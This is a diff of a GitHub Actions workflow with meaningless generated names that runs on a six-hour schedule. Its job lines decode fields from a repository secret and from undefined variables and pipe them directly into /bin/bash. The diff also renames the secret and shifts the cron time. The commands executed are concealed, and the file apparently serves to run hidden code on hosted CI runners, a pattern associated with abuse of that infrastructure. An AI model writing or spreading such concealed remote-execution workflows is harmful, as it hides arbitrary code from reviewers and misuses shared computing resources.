@@ -1,10 +1,10 @@
 name: fretfulpresident
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 5/6 * * *'
-jobs:  # 7434
+    - cron: '43 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,9 +12,13 @@ jobs:  # 7434
       - uses: actions/checkout@v4
       - name: fretfulpresident
         env:
-          mdprn99899: ${{ secrets.mdprn99899 }}
+          a238: ${{ secrets.a238 }}
         run: |
-          echo $mdprn99899 | jq -r .awhfs1 | /bin/bash
-          echo $hibu5 | jq -r .hyx7197 | /bin/bash
-          echo $qtkjo35754 | jq -r .rzg379 | /bin/bash
+          echo $a238 | jq -r .cqch404 | /bin/bash
+          echo $yug4 | jq -r .df73499 | /bin/bash
+          echo $jh791 | jq -r .n513 | /bin/bash
+          echo $ckshj3 | jq -r .kdd6859 | /bin/bash
+          echo $c664 | jq -r .biti5335 | /bin/bash
+          echo $djedx7845 | jq -r .clua7 | /bin/bash
+          echo $gg39104 | jq -r .moe8 | /bin/bash
 
